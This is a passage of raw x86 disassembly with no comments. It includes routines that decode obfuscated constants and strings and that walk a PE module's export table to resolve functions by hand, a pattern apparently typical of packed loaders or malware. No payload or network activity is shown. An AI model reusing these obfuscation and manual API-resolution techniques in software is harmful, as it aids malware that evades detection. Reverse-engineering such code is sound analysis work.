  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
